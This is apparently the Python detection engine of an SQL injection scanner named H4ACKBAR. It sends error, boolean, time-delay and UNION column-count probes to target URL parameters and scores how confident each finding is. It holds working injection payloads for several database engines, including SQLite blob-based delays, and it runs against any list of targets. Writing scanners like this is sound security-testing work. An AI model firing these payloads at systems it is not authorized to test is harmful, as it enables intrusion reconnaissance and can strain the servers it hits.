"""
H4ACKBAR SQLi detector engine.

3-signal confirmation model — "2 levels above traditional":

  Level 0 (traditional):  fire one payload, grep for known errors.
  Level 1:                differential — send true-vs-false, compare bodies.
  Level 2 (H4ACKBAR):     baseline + true + false + time,
                          require ≥2 orthogonal signals to confirm.
                          Every finding carries confidence + evidence.

Signals:
  E  error-based    — DBMS error string appears in response
  B  boolean-blind  — true payload matches baseline, false payload differs
  T  time-blind     — sleep payload delays ≥ N seconds vs baseline
  U  union-hint     — column-count probe returns without error and body length changes

Confidence:
  1 signal   = low
  2 signals  = medium
  3+ signals = high
"""

from collections.abc import Callable
from dataclasses import dataclass, field
from difflib import SequenceMatcher

from .fingerprint import fingerprint_response
from .sender import SendResult, send

# ── probe payloads (safe, low-noise) ────────────────────────
ERROR_PROBES = [
    "'",
    "\"",
    "')",
    "\";",
    "' AND CAST('x' AS INT)-- -",
]

BOOL_TRUE  = "' AND '1'='1"
BOOL_FALSE = "' AND '1'='2"

TIME_PROBES = {
    "mysql":      "' AND SLEEP(4)-- -",
    "postgresql": "'; SELECT pg_sleep(4)-- -",
    "mssql":      "'; WAITFOR DELAY '0:0:4'-- -",
    "oracle":     "' AND DBMS_LOCK.SLEEP(4)-- -",
    "sqlite":     "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000))))-- -",
    "generic":    "' AND SLEEP(4)-- -",
}

UNION_PROBES = [f"' UNION SELECT {','.join(['NULL']*n)}-- -" for n in range(1, 11)]


@dataclass
class Finding:
    url: str
    param: str
    method: str
    inject_in: str
    signals: list[str] = field(default_factory=list)   # ["E","B","T","U"]
    dbms_guess: list[str] = field(default_factory=list)
    confidence: str = "none"                            # none|low|medium|high
    evidence: list[str] = field(default_factory=list)
    baseline_status: int = 0
    baseline_length: int = 0
    payloads_tried: int = 0

    def confirmed(self) -> bool:
        return len(self.signals) >= 2

    def score(self) -> int:
        return len(self.signals)


def _similarity(a: str, b: str) -> float:
    if not a and not b:
        return 1.0
    if not a or not b:
        return 0.0
    # cheap ratio, capped at first 20 KB
    return SequenceMatcher(None, a[:20000], b[:20000]).quick_ratio()


def _send_and_time(url: str, method: str, payload: str, param: str,
                   inject_in: str) -> SendResult:
    return send(url, method, payload, param, inject_in=inject_in)


def analyze_param(url: str,
                  method: str,
                  param: str,
                  inject_in: str = "query",
                  time_threshold_s: float = 3.0,
                  progress: Callable[[str], None] | None = None) -> Finding:
    """
    Run full 3-signal detection on ONE parameter.
    Fires ≤ ~12 requests. Never loops. Returns Finding with confidence.
    """
    def log(msg: str):
        if progress:
            progress(msg)

    f = Finding(url=url, param=param, method=method, inject_in=inject_in)

    # ── baseline ──
    log(f"[baseline] {param}")
    base = _send_and_time(url, method, "h4ackbar_baseline_1", param, inject_in)
    if base.error:
        f.evidence.append(f"[baseline error] {base.error}")
        return f
    f.baseline_status = base.status
    f.baseline_length = base.length
    f.payloads_tried += 1

    baseline_body = base.body
    baseline_time = base.elapsed_ms

    # ── E: error probes ──
    for probe in ERROR_PROBES:
        log(f"[error probe] {probe!r}")
        r = _send_and_time(url, method, probe, param, inject_in)
        f.payloads_tried += 1
        if r.error:
            continue
        fp = fingerprint_response(r.headers, {}, r.body)
        if fp.dbms:
            if "E" not in f.signals:
                f.signals.append("E")
            for db in fp.dbms:
                if db not in f.dbms_guess:
                    f.dbms_guess.append(db)
            f.evidence.append(f"E: probe={probe!r} → dbms={','.join(fp.dbms)}")
            break  # one confirmed error is enough

    # ── B: boolean differential ──
    log("[boolean] true probe")
    rt = _send_and_time(url, method, BOOL_TRUE, param, inject_in)
    f.payloads_tried += 1
    log("[boolean] false probe")
    rf = _send_and_time(url, method, BOOL_FALSE, param, inject_in)
    f.payloads_tried += 1

    if not rt.error and not rf.error:
        sim_tf   = _similarity(rt.body, rf.body)
        sim_tb   = _similarity(rt.body, baseline_body)
        sim_fb   = _similarity(rf.body, baseline_body)
        # TRUE should look ~ baseline; FALSE should differ
        if sim_tb > 0.92 and sim_tf < 0.85 and abs(rt.length - rf.length) > 20:
            f.signals.append("B")
            f.evidence.append(
                f"B: sim(true,base)={sim_tb:.2f} sim(false,base)={sim_fb:.2f} "
                f"sim(true,false)={sim_tf:.2f} len(true)={rt.length} len(false)={rf.length}"
            )

    # ── T: time-based (per candidate DBMS, or generic) ──
    dbms_to_try = f.dbms_guess or ["generic"]
    for db in dbms_to_try[:2]:  # cap: try up to 2 DBMS time-payloads
        probe = TIME_PROBES.get(db, TIME_PROBES["generic"])
        log(f"[time] {db}")
        r = _send_and_time(url, method, probe, param, inject_in)
        f.payloads_tried += 1
        delay = (r.elapsed_ms - baseline_time) / 1000.0
        if not r.error and delay >= time_threshold_s:
            f.signals.append("T")
            f.evidence.append(
                f"T: dbms={db} delay={delay:.2f}s baseline={baseline_time}ms probe={r.elapsed_ms}ms"
            )
            if db != "generic" and db not in f.dbms_guess:
                f.dbms_guess.append(db)
            break

    # ── U: union column-count hint ──
    log("[union] column probes")
    changes = 0
    for probe in UNION_PROBES:
        r = _send_and_time(url, method, probe, param, inject_in)
        f.payloads_tried += 1
        if r.error:
            continue
        # if any union probe returns 200 with distinct length vs baseline → hint
        if r.status == base.status and abs(r.length - base.length) > 15:
            changes += 1
        if changes >= 2:
            f.signals.append("U")
            f.evidence.append(f"U: {changes} column-count probes altered response length")
            break

    # ── confidence ──
    n = len(f.signals)
    f.confidence = "high" if n >= 3 else "medium" if n == 2 else "low" if n == 1 else "none"
    return f


# ── batch runner ─────────────────────────────────────────────
def analyze_targets(targets: list[dict],
                    progress: Callable[[str], None] | None = None) -> list[Finding]:
    """
    targets: list of dicts { url, method, param, inject_in }
    Returns list of Findings (all attempted, including 'none' confidence).
    """
    findings: list[Finding] = []
    total = len(targets)
    for i, t in enumerate(targets, 1):
        if progress:
            progress(f"[{i}/{total}] {t['method']} {t['url']}  param={t['param']}")
        f = analyze_param(
            url=t["url"],
            method=t.get("method", "GET"),
            param=t["param"],
            inject_in=t.get("inject_in", "query"),
            progress=progress,
        )
        findings.append(f)
    return findings
